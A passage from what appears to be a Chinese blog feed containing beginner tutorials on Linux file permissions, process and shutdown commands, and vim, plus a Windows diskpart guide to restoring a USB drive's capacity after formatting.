用户名<br></code></pre></div></td></tr></table></figure><p>修改 /etc/sudoers ，需要强制保存退出。如图。</p><p><img src="https://img-blog.csdnimg.cn/20210525094736649.png"></p><h3 id="1-14-usermod-g-与-G的区别"><a href="#1-14-usermod-g-与-G的区别" class="headerlink" title="1.14 usermod -g 与 -G的区别"></a>1.14 usermod -g 与 -G的区别</h3><blockquote><ol><li>-g ：用来制定这个用户默认的用户组</li></ol></blockquote><blockquote><ol start="2"><li>-G ：一般配合 ‘-a’ 来完成向其他组添加</li></ol></blockquote><h3 id="1-15-chown-命令"><a href="#1-15-chown-命令" class="headerlink" title="1.15 chown 命令"></a>1.15 chown 命令</h3><p>修改文件所有者。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">chown 新用户名 文件名<br></code></pre></div></td></tr></table></figure><h3 id="1-16-chgrp-命令"><a href="#1-16-chgrp-命令" class="headerlink" title="1.16 chgrp 命令"></a>1.16 chgrp 命令</h3><p>修改文件所属组。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">chgrp 新组名 文件名<br></code></pre></div></td></tr></table></figure><h3 id="1-17-chmod-命令"><a href="#1-17-chmod-命令" class="headerlink" title="1.17 chmod 命令"></a>1.17 chmod 命令</h3><p>修改文件权限。</p><h4 id="1-17-1-权限"><a href="#1-17-1-权限" class="headerlink" title="1.17.1 权限"></a>1.17.1 权限</h4><blockquote><ol><li>r</li></ol></blockquote><p>read 表示可读取，对于一个目录，如果没有 r 权限，那么就意味着不能 ls 查看这个目录的内容。</p><blockquote><ol start="2"><li>w</li></ol></blockquote><p>write 表示可写入，对于一个目录，如果没有 w 权限，那么就意味着不能在目录下创建新的文件。</p><blockquote><ol start="3"><li>x</li></ol></blockquote><p>excute 表示可执行，对于一个目录，如果没有 x 权限，那么就意味着不能通过 cd 进入这个目录。</p><p>如图。</p><p><img src="https://img-blog.csdnimg.cn/20210525095621934.png"></p><h4 id="1-17-2-修改"><a href="#1-17-2-修改" class="headerlink" title="1.17.2 修改"></a>1.17.2 修改</h4><h5 id="1-17-2-1-字母法"><a href="#1-17-2-1-字母法" class="headerlink" title="1.17.2.1 字母法"></a>1.17.2.1 字母法</h5><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">chmod u/g/o/a +/-/= rwx 文件<br></code></pre></div></td></tr></table></figure><p>其中，u/g/o/a 含义：</p><blockquote><ol><li>u ：user 表示该文件的所有者</li></ol></blockquote><blockquote><ol start="2"><li>g ：group 表示与该文件的所有者属于同一组（group）者，即用户组。</li></ol></blockquote><blockquote><ol start="3"><li>o ：other 表示其他以外的人。</li></ol></blockquote><blockquote><ol start="4"><li>a ：all 表示这三者皆是。</li></ol></blockquote><p>其中，+/-/= 的含义：</p><blockquote><ol><li>+ ：增加权限</li></ol></blockquote><blockquote><ol start="2"><li>- ：撤销权限</li></ol></blockquote><blockquote><ol start="3"><li>= ：设定权限</li></ol></blockquote><h5 id="1-17-2-2-数字法"><a href="#1-17-2-2-数字法" class="headerlink" title="1.17.2.2 数字法"></a>1.17.2.2 数字法</h5><blockquote><ol><li>r ：读取权限，数字代号为 “4”。</li></ol></blockquote><blockquote><ol start="2"><li>w ：写入权限，数字代号为 “2”。</li></ol></blockquote><blockquote><ol start="3"><li>x ：执行权限，数字代号为 “1”。</li></ol></blockquote><blockquote><ol start="4"><li>- ：不具任何权限，数字代号为 “0”。</li></ol></blockquote><p>如：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">chmod 751 file <br></code></pre></div></td></tr></table></figure><p>文件所有者：读、写、执行权限。<br>同组用户：读、执行的权限。<br>其他用户：执行的权限。</p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-基本命令（三）</title>
    <link href="/2021/05/25/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/25/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统。主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版。</p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux不仅仅是被网络运维人员当作服务器使用，甚至当作网络防火墙。Linux具有开放源码、没有版权、技术社区用户多等特点，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈，经过适当的配置就可实现路由器的功能。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-下载命令"><a href="#1-下载命令" class="headerlink" title="1.下载命令"></a>1.下载命令</h2><blockquote><ol><li>wget</li></ol></blockquote><blockquote><ol start="2"><li>curl</li></ol></blockquote><h2 id="2-系统管理"><a href="#2-系统管理" class="headerlink" title="2.系统管理"></a>2.系统管理</h2><h3 id="2-1-cal-命令"><a href="#2-1-cal-命令" class="headerlink" title="2.1 cal 命令"></a>2.1 cal 命令</h3><p>查看当前日历。</p><blockquote><ol><li>显示整年日历</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cal -y<br></code></pre></div></td></tr></table></figure><h3 id="2-2-date-命令"><a href="#2-2-date-命令" class="headerlink" title="2.2 date 命令"></a>2.2 date 命令</h3><p>显示或设置时间。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">date [MMDDhhmm[[CC]YY][.ss]] +format<br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">符号</th><th align="center">表示</th></tr></thead><tbody><tr><td align="center">%Y,%y</td><td align="center">年</td></tr><tr><td align="center">%m</td><td align="center">月</td></tr><tr><td align="center">%d</td><td align="center">日</td></tr><tr><td align="center">%H</td><td align="center">时</td></tr><tr><td align="center">%M</td><td align="center">分</td></tr><tr><td align="center">%S</td><td align="center">秒</td></tr></tbody></table><h3 id="2-3-ps-命令"><a href="#2-3-ps-命令" class="headerlink" title="2.3 ps 命令"></a>2.3 ps 命令</h3><p>查看进程信息。</p><h4 id="2-3-1-选项"><a href="#2-3-1-选项" class="headerlink" title="2.3.1 选项"></a>2.3.1 选项</h4><blockquote><ol><li>-a ：显示终端上的所有进程，包括其他用户的进程</li></ol></blockquote><blockquote><ol start="2"><li>-u ：显示进程的详细状态</li></ol></blockquote><blockquote><ol start="3"><li>-x：显示没有控制终端的进程</li></ol></blockquote><blockquote><ol start="4"><li>-w ：显示加宽，以便显示更多的信息</li></ol></blockquote><blockquote><ol start="5"><li>-r ：只显示正在运行的进程</li></ol></blockquote><h3 id="2-4-top-命令"><a href="#2-4-top-命令" class="headerlink" title="2.4 top 命令"></a>2.4 top 命令</h3><p>多态显示进程。能够在运行后，在指定的时间间隔更新显示信息。可以在使用 top 命令时加上 -d 来指定显示信息更新的时间间隔。</p><h4 id="2-4-1-按键"><a href="#2-4-1-按键" class="headerlink" title="2.4.1 按键"></a>2.4.1 按键</h4><blockquote><ol><li>M ：根据内存使用量来排序</li></ol></blockquote><blockquote><ol start="2"><li>P ：根据CPU占有率来排序</li></ol></blockquote><blockquote><ol start="3"><li>T ：根据进程运行时间的长短来排序</li></ol></blockquote><blockquote><ol start="4"><li>U ：可以根据后面输入的用户名来筛选进程</li></ol></blockquote><blockquote><ol start="5"><li>K ：可以根据后面输入的 PID 来杀死进程</li></ol></blockquote><blockquote><ol start="6"><li>q ：退出</li></ol></blockquote><blockquote><ol start="7"><li>h ：获得帮助</li></ol></blockquote><h3 id="2-5-kill-命令"><a href="#2-5-kill-命令" class="headerlink" title="2.5 kill 命令"></a>2.5 kill 命令</h3><p>终止进程。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> [-signal] pid<br></code></pre></div></td></tr></table></figure><p>需要注意的是，信号值从 0 到 15，其中 9 为绝对终止，可以处理一般信号无法终止的进程。</p><h3 id="2-6-reboot、shutdown、init-命令"><a href="#2-6-reboot、shutdown、init-命令" class="headerlink" title="2.6 reboot、shutdown、init 命令"></a>2.6 reboot、shutdown、init 命令</h3><p>关机重启。</p><blockquote><ol><li>重新启动操作系统</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">reboot<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>重新启动操作系统，shutdown 会给别的用户提示</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">shutdown -r now<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>立刻关机，其中 now 相当于时间为 0 的状态</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">shutdown -h now<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>系统在今天 20：25 会关机</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">shutdown -h 20:25<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>系统再过十分钟后自动关机</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">shutdown -h +10<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>关机</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">init 0<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>重启</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">init 6<br></code></pre></div></td></tr></table></figure><h3 id="2-7-df-命令"><a href="#2-7-df-命令" class="headerlink" title="2.7 df 命令"></a>2.7 df 命令</h3><p>检测文件系统的磁盘空间占用和空余情况，可以显示所有文件系统对节点和磁盘块的使用情况。</p><h4 id="2-7-1-选项"><a href="#2-7-1-选项" class="headerlink" title="2.7.1 选项"></a>2.7.1 选项</h4><blockquote><ol><li>-a ：显示所有文件系统的磁盘使用情况</li></ol></blockquote><blockquote><ol start="2"><li>-m ：以 1024 字节为单位显示</li></ol></blockquote><blockquote><ol start="3"><li>-t ：显示各指定文件系统的磁盘空间使用情况</li></ol></blockquote><blockquote><ol start="4"><li>-T ：显示文件系统</li></ol></blockquote><h3 id="2-8-du-命令"><a href="#2-8-du-命令" class="headerlink" title="2.8 du 命令"></a>2.8 du 命令</h3><p>检测目录所占磁盘空间，侧重于磁盘的使用状况。</p><blockquote><ol><li>-a ：递归显示指定目录中各文件和子目录中文件占用的数据块</li></ol></blockquote><blockquote><ol start="2"><li>-s ：显示指定文件或目录占用的数据块</li></ol></blockquote><blockquote><ol start="3"><li>-l ：计算所有文件大小，对硬链接文件计算多次</li></ol></blockquote><blockquote><ol start="4"><li>-h ：转换单位</li></ol></blockquote><h3 id="2-9-ifconfig-命令"><a href="#2-9-ifconfig-命令" class="headerlink" title="2.9 ifconfig 命令"></a>2.9 ifconfig 命令</h3><p>显示或修改网卡信息。</p><h3 id="2-10-ping-命令"><a href="#2-10-ping-命令" class="headerlink" title="2.10 ping 命令"></a>2.10 ping 命令</h3><p>测试远程主机的连通性。</p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>U盘格式化后容量变小了-容量恢复教程</title>
    <link href="/2021/05/24/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/U%E7%9B%98%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%90%8E%E5%AE%B9%E9%87%8F%E5%8F%98%E5%B0%8F%E4%BA%86-%E6%81%A2%E5%A4%8D%E6%95%99%E7%A8%8B/"/>
    <url>/2021/05/24/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/U%E7%9B%98%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%90%8E%E5%AE%B9%E9%87%8F%E5%8F%98%E5%B0%8F%E4%BA%86-%E6%81%A2%E5%A4%8D%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>有U盘的可能会遇到U盘容量不正常的情况，比如U盘做了启动盘后，U盘量产过，U盘用其他软件格式化过后导致U盘容量变小了，比如原来有16G的变成了只有7G了。一般U盘容量变小了，但实际上还是正常没有坏，U盘的读写是没问题的。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><strong>若U盘里有重要数据需要拷贝出来，因为下面的操作会格式化U盘，数据不导出会被删的。</strong></p><h2 id="方法-步骤"><a href="#方法-步骤" class="headerlink" title="方法/步骤"></a>方法/步骤</h2><blockquote><ol><li>在开始菜单-运行，然后输入cmd后回车，这就进入dos窗口了，然后输入diskpart，这样就进入了磁盘管理命令模式。（进入cmd中输入）</li></ol></blockquote><blockquote><ol start="2"><li>输入命令“list disk（注意空格），然后回车进去，就可以看到你电脑里所有的硬盘设备了，当然也包括U盘设备，而且你会发现这里显示的设备容量是真实的容量。所以看到这里就知道下面的操作靠谱，绝对是可以恢复实际容量的。</li></ol></blockquote><blockquote><ol start="3"><li>这时候我们要操作U盘，就必须用命令选中它，这里的例子是“磁盘 2”是U盘，所以我们输入命令“select disk 2（注意空格）”回车，看提示“磁盘 2 现在是所选磁盘”就代表着成功选中了，你要看你的U盘是磁盘几，可能是磁盘3也可能磁盘4。</li></ol></blockquote><blockquote><ol start="4"><li>输入命令“clean”清除磁盘，也就是清除U盘本身。</li></ol></blockquote><p><strong>操作到这里U盘已经被系统清除了，电脑里也没有U盘可见的盘符了，这时候别担心，接着操作。</strong></p><blockquote><ol start="5"><li>关掉diskpart命令窗口，鼠标右键点我的电脑，弹出的菜单里选择管理，然后选择“磁盘管理”。 </li></ol></blockquote><blockquote><ol start="6"><li>在磁盘管理中，找到自己的U盘，这时候应该变成“未分配”模式，右键单击 新建简单卷 跟着向导重新建立U盘格式就可以了。</li></ol></blockquote><p>再在我的电脑里，可以发现U盘容量已经恢复正常了，不过就是之前的数据没有了，所以操作之前一定要备份数据，这是很关键的，它可以恢复实际容量但不能恢复里面的内容。</p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-基本命令（二）</title>
    <link href="/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统。主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版。</p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux不仅仅是被网络运维人员当作服务器使用，甚至当作网络防火墙。Linux具有开放源码、没有版权、技术社区用户多等特点，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈，经过适当的配置就可实现路由器的功能。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Vi-编辑器"><a href="#1-Vi-编辑器" class="headerlink" title="1. Vi 编辑器"></a>1. Vi 编辑器</h2><p>打开文件编辑并保存退出文件。</p><h3 id="1-1-打开文件"><a href="#1-1-打开文件" class="headerlink" title="1.1 打开文件"></a>1.1 打开文件</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim 文件名<br></code></pre></div></td></tr></table></figure><p>如果文件不存在则先打开，当关闭保存时自动创建该文件。</p><h3 id="1-2-示例"><a href="#1-2-示例" class="headerlink" title="1.2 示例"></a>1.2 示例</h3><blockquote><ol><li></li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim sunck.txt<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>打开文件，将光标移动到第四行。如果文件不存在则没有效果。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim sunck.txt +5<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>打开文件，将光标移动到最后一行。如果文件不存在则没有效果。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim sunck.txt +<br></code></pre></div></td></tr></table></figure><h3 id="1-3-命令模式"><a href="#1-3-命令模式" class="headerlink" title="1.3 命令模式"></a>1.3 命令模式</h3><h4 id="1-3-1-进入命令模式"><a href="#1-3-1-进入命令模式" class="headerlink" title="1.3.1 进入命令模式"></a>1.3.1 进入命令模式</h4><p>打开文件即进入命令模式。按 ESC。</p><h4 id="1-3-2-命令"><a href="#1-3-2-命令" class="headerlink" title="1.3.2 命令"></a>1.3.2 命令</h4><h5 id="1-3-2-1-移动光标"><a href="#1-3-2-1-移动光标" class="headerlink" title="1.3.2.1 移动光标"></a>1.3.2.1 移动光标</h5><blockquote><ol><li>移动光标</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">上下左右方向键。<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>光标快速的定位到末行行首</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">G<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>光标快速定位到该行行尾</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>光标快速定位到该行行首</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">^<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>光标快速定位到第一行行首</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gg<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>光标快速定位到第 n 行行首</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ngg<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>光标移动到中间行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">M<br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>光标移动到屏幕最后一行行首</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">L<br></code></pre></div></td></tr></table></figure><blockquote><ol start="9"><li> 向后一次移动一个字</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">w<br></code></pre></div></td></tr></table></figure><blockquote><ol start="10"><li>向前一次移动一个字</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">b<br></code></pre></div></td></tr></table></figure><blockquote><ol start="11"><li>向下、上翻半屏</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ctr + d 、ctr + u<br></code></pre></div></td></tr></table></figure><blockquote><ol start="12"><li>向下、上翻一屏</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ctr + f 、ctr + b<br></code></pre></div></td></tr></table></figure><blockquote><ol start="13"><li>左、下、上、右移动光标</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">h、j、k、l<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-2-删除命令"><a href="#1-3-2-2-删除命令" class="headerlink" title="1.3.2.2 删除命令"></a>1.3.2.2 删除命令</h5><blockquote><ol><li>删除光标后一个字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">x<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>删除光标前一个字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">X<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>删除光标所在行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">dd<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>删除指定的行数</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ndd<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>删除光标前本行所有内容，不包括光标所在字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">d0<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>删除光标开始位置的字，包含光标所在字符</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">dw<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-3-撤销命令"><a href="#1-3-2-3-撤销命令" class="headerlink" title="1.3.2.3 撤销命令"></a>1.3.2.3 撤销命令</h5><blockquote><ol><li>一步一步撤销</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">u<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>反撤销</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ctr + r<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-4-重复命令"><a href="#1-3-2-4-重复命令" class="headerlink" title="1.3.2.4 重复命令"></a>1.3.2.4 重复命令</h5><p>重复上一次操作。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">.<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-5-文本行移动"><a href="#1-3-2-5-文本行移动" class="headerlink" title="1.3.2.5 文本行移动"></a>1.3.2.5 文本行移动</h5><blockquote><ol><li>文本行右移</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">shift</span> + &gt;&gt;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>文本行左移</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">shift</span> + &lt;&lt;<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-6-复制粘贴"><a href="#1-3-2-6-复制粘贴" class="headerlink" title="1.3.2.6 复制粘贴"></a>1.3.2.6 复制粘贴</h5><blockquote><ol><li>复制当前行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">yy<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>复制 n 行</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nyy<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>在光标所在位置向下新开屁一行，粘贴</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">p<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-7-剪切粘贴"><a href="#1-3-2-7-剪切粘贴" class="headerlink" title="1.3.2.7 剪切粘贴"></a>1.3.2.7 剪切粘贴</h5><p>删除命令相当于剪切。<br>在光标所在位置向下新开屁一行，粘贴。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">p<br></code></pre></div></td></tr></table></figure><h5 id="1-3-2-8-可视模式"><a href="#1-3-2-8-可视模式" class="headerlink" title="1.3.2.8 可视模式"></a>1.3.2.8 可视模式</h5><blockquote><ol><li>按字符移动，选中文本</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 